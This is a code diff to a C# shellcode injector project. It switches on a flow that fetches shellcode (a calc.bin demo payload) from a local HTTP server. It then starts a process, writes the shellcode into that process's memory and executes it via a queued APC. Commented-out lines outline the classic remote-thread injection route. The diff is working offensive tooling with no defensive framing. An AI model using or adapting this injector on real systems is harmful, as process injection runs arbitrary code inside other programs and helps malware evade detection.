@@ -11,20 +11,21 @@ namespace Shellcode_Injector
             new WinApi();
 
             // Fetch shellcode
-            //byte[] shellcode = Helpers.Fetch("http://localhost:8080", "calc.bin");
+            byte[] shellcode = Helpers.Fetch("http://localhost:8080", "calc.bin");
 
             //var pid = 9776;
             //var phand = Helpers.GetHand(pid);
 
             // Standard flow -> virtualallocex, virtualprotextex, writeprocessmemory, createremotethread
-            //IntPtr rmem = Helpers.MWrite(phand, shellcode);
-            //Helpers.SCRun("crt", phand, rmem);
+            //WinApi.PIN pinfo = Helpers.StartS();
+            //IntPtr rmem = Helpers.MWrite(pinfo.hProcess, shellcode);
+            //Helpers.SCRun("crt", pinfo.hProcess, rmem);
 
 
             // queue user apc flow trough creating new process
-            WinApi.PIN pinfo = Helpers.StartS(true, 2132);
-            //IntPtr mem = Helpers.MWrite(pinfo.hProcess, shellcode);
-            //Helpers.SCRun("qua", pinfo.hThread, mem);
+            WinApi.PIN pinfo = Helpers.StartS();
+            IntPtr mem = Helpers.MWrite(pinfo.hProcess, shellcode);
+            Helpers.SCRun("qua", pinfo.hThread, mem);
 
 
             // ntdll.dll approach, it can be used with created process or remote process
